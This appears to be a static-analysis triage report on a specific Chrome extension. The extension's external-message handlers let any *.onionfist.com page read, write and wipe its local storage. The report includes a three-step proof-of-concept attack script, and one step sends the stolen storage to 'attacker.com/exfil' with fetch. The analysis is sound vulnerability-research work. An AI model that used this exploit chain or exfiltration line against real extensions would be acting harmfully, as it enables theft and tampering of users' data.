# CoCo Analysis: imkabmapkhnlkiabmpgjjhlglcjphbkb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 8 (2 storage_get → sendResponse, 6 external message → storage.set, but they form a complete exploitation chain)

---

## Sink 1 & 2: storage_local_get_source → sendResponseExternal_sink (CoCo framework code only)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/imkabmapkhnlkiabmpgjjhlglcjphbkb/opgen_generated_files/bg.js
Line 751-752 (CoCo framework code)

**Note:** These detections reference only CoCo framework code. However, the actual extension code contains the same pattern.

---

## Sink 3-8: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink + Complete Storage Exploitation Chain

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/imkabmapkhnlkiabmpgjjhlglcjphbkb/opgen_generated_files/bg.js
Line 1007-1082

**Code:**

```javascript
// Background script - External message listener (line 989)
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) {

    // Handler 1: Get storage data and send back (lines 998-1003)
    if (request.code == "get_from_web") {
        console.log("RECEIVED get_from_web", request.keys)
        chrome.storage.local.get(request.keys, function(items) {
            sendResponse(items); // ← Storage data sent back to attacker
        });
    }

    // Handler 2: Write attacker-controlled data to storage (lines 1004-1016)
    else if (request.code == "set_from_web") {
        console.log("RECEIVED set_from_web");
        var obj = {};
        for (let key in request.obj) { // ← attacker-controlled
            let val = to_num(request.obj[key]); // ← attacker-controlled
            obj[key] = val;
        }
        chrome.storage.local.set(obj); // ← Storage write with attacker data
        sendResponse();
    }

    // Handler 3: Overwrite storage with attacker data (lines 1069-1090)
    else if (request.code == "overwrite_chrx") {
        chrome.storage.local.clear(function() {
            var obj = {};
            for (let key in request.new_data) { // ← attacker-controlled
                let val = to_num(request.new_data[key]); // ← attacker-controlled
                obj[key] = val;
            }
            chrome.storage.local.set(obj, function() { // ← Storage write
                sendResponse();
            });
        });
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages from whitelisted domain (https://*.onionfist.com/*)

**Attack:**

```javascript
// From https://evil.onionfist.com/ or any onionfist.com subdomain

// Step 1: Poison storage with malicious data
chrome.runtime.sendMessage(
  'imkabmapkhnlkiabmpgjjhlglcjphbkb',
  {
    code: "set_from_web",
    obj: {
      "game_score": "999999",
      "user_level": "admin",
      "unlock_all": "true"
    }
  }
);

// Step 2: Read back stored data (information disclosure)
chrome.runtime.sendMessage(
  'imkabmapkhnlkiabmpgjjhlglcjphbkb',
  {
    code: "get_from_web",
    keys: null  // Get all storage data
  },
  function(response) {
    console.log("Stolen storage data:", response);
    // Exfiltrate to attacker server
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify(response)
    });
  }
);

// Step 3: Complete storage overwrite
chrome.runtime.sendMessage(
  'imkabmapkhnlkiabmpgjjhlglcjphbkb',
  {
    code: "overwrite_chrx",
    new_data: {
      "malicious_key": "malicious_value",
      "game_state": "corrupted"
    }
  }
);
```

**Impact:** Complete storage exploitation chain - attacker from *.onionfist.com can write arbitrary data to storage, read back all stored data (information disclosure), and completely overwrite extension storage. This allows game state manipulation, data exfiltration, and storage corruption. The bidirectional nature (write + read back) makes this a complete exploitation chain under the methodology.
